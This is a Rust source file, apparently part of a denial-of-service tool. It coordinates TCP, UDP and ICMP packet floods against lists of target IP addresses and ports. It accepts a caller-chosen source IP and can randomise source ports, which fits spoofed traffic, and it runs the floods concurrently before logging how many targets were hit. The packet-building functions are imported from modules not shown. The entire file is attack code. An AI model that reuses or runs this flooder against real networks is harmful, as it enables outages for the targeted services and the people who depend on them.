use super::{icmp_flood::icmp_flood, udp_flood::udp_flood};
use crate::{
    flooder::tcp_flood::tcp_flood,
    networking::{interface::Interface, socket_iterator::SocketIterator},
};
use futures::{stream::FuturesUnordered, StreamExt};
use log::info;
use rand::Rng;
use std::net::IpAddr;

#[derive(Debug)]
pub enum FloodMethod {
    Tcp,
    Udp,
    Icmp,
}

pub struct Flooder;

impl Flooder {
    #[allow(clippy::too_many_arguments)]
    pub async fn flood(
        interface: Interface,
        method: FloodMethod,
        src_ip: IpAddr,
        src_port: u16,
        ip_addresses: &[IpAddr],
        port_numbers: &[u16],
        number_of_packets: usize,
        should_randomize_ports: bool,
    ) {
        let total_targets = ip_addresses.len();
        let total_ports = port_numbers.len();
        let total_packets = total_ports * number_of_packets;

        let sockets = SocketIterator::new(ip_addresses, port_numbers);

        let flood_method = match method {
            FloodMethod::Tcp => tcp_flood,
            FloodMethod::Udp => udp_flood,
            FloodMethod::Icmp => icmp_flood,
        };

        let mut futures = FuturesUnordered::new();

        sockets.for_each(|socket| {
            let origin_port = if !should_randomize_ports {
                src_port
            } else {
                let mut rng = rand::thread_rng();
                rng.gen_range(1..=65535)
            };

            futures.push(tokio::task::spawn_blocking(move || {
                flood_method(
                    interface,
                    src_ip,
                    origin_port,
                    socket.ip(),
                    socket.port(),
                    number_of_packets,
                )
                .map(|scan| (socket, scan))
            }))
        });

        let mut errors = 0;

        while let Some(result) = futures.next().await {
            match result {
                Ok(Ok(_)) => (),
                Err(_) => errors += 1,
                _ => (),
            }
        }

        info!(
            "Flooded {} target(s) with {} packets each.",
            total_targets, total_packets
        );

        info!(
            "There were {} errors while trying to flood the sockets.",
            errors
        );
    }
}
